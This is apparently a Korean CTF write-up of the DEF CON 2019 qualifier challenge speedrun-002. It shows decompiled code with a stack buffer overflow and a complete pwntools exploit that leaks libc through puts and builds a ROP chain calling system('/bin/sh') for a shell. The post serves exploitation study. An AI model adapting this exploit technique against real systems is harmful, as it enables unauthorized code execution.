---
title: "2019 Defcon CTF speedrun-002"
date: 2020-1-4
tags: [Defcon]
categories: [Defcon]
---

매우 간단한 바이너리다. strncmp로 비교해서 `Everything ...` 과 같으면  `sub_400705` 함수로 가는데 이 함수에서 취약점 터진다.

```c
int sub_40074C()
{
  int result; // eax
  char buf; // [rsp+0h] [rbp-590h]
  char v2; // [rsp+190h] [rbp-400h]

  puts("What say you now?");
  read(0, &buf, 300uLL);
  if ( !strncmp(&buf, "Everything intelligent is so boring.", 0x24uLL) )
    result = sub_400705(&v2);
  else
    result = puts("What a ho-hum thing to say.");
  return result;
}
```

v2의 크기는 0x400인데 2010만큼 받고있다..

```c
ssize_t __fastcall sub_400705(void *a1)
{
  puts("What an interesting thing to say.\nTell me more.");
  read(0, a1, 2010uLL);
  return write(1, "Fascinating.\n", 13uLL);
}
```

왜인지 모르겠지만 원가젯이 안 먹혀서 그냥 system이랑 /bin/sh 구해서 익스했다..

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./speedrun-002')
p = process('./speedrun-002')
libc = e.libc
prdi = 0x00000000004008a3 # pop rdi ; ret
prdx = 0x00000000004006ec # pop rdx ; ret
prsi_r15 = 0x00000000004008a1 # pop rsi ; pop r15 ; ret
main = 0x00000000004007CE

p.sendlineafter('?','Everything intelligent is so boring.')

payload = 'A'*0x400
payload += 'realsung'
payload += p64(prdi)
payload += p64(e.got['puts'])
payload += p64(e.plt['puts'])
payload += p64(main)
p.sendafter('more.',payload)

libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))

p.sendlineafter('?','Everything intelligent is so boring.')

payload2 = 'A'*0x400
payload2 += 'realsung'
payload2 += p64(prdi)
payload2 += p64(libc_base + libc.search('/bin/sh').next())
payload2 += p64(libc_base + libc.symbols['system'])
p.sendlineafter('more.',payload2)

p.interactive()
```

